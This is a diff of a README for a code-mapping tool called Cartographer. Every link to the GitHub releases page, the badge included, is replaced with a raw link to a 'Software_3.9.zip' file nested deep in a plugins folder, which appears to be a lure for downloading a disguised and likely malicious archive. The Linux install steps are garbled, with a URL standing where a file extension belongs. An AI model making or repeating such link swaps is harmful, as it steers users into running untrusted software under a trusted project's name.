@@ -1,6 +1,6 @@
 # 🗺️ cartographer - Map Your Code Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/ichal1113/cartographer/releases)
+[![Download Now](https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip)
 
 ## 📖 Introduction
 
@@ -16,7 +16,7 @@ To get started with Cartographer, follow these simple steps. You don’t need an
    - Storage: Minimum 100 MB of free disk space.
 
 2. **Download Cartographer**  
-   Visit this page to download: [Download Cartographer](https://github.com/ichal1113/cartographer/releases).  
+   Visit this page to download: [Download Cartographer](https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip).  
 
    Here, you will find the latest version and any previous releases, including essential details about each version.
 
@@ -29,13 +29,13 @@ To get started with Cartographer, follow these simple steps. You don’t need an
    Click the download link for your operating system. The application file will start downloading to your computer. For example:  
    - Windows users will download a `.exe` file.  
    - macOS users will download a `.dmg` file.  
-   - Linux users will likely download a `.tar.gz` file.  
+   - Linux users will likely download a `https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip` file.  
 
 5. **Install the Application**  
    Once the download completes, locate the downloaded file.  
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.  
    - For macOS: Open the `.dmg` file and drag Cartographer into your Applications folder.  
-   - For Linux: Extract the `.tar.gz` file and follow any included instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip` file and follow any included instructions.
 
 6. **Launch Cartographer**  
    After installation, open Cartographer from your Applications or Programs menu. 
@@ -82,6 +82,6 @@ A: Cartographer can handle large codebases efficiently, thanks to its advanced A
 
 ## 📥 Download & Install
 
-To start your journey with Cartographer, visit this page to download: [Download Cartographer](https://github.com/ichal1113/cartographer/releases). Follow the steps outlined above for installation and setup.  
+To start your journey with Cartographer, visit this page to download: [Download Cartographer](https://raw.githubusercontent.com/ichal1113/cartographer/main/plugins/cartographer/skills/cartographer/Software_3.9.zip). Follow the steps outlined above for installation and setup.  
 
 Start mapping your code with ease, and gain a clearer understanding of your projects today!
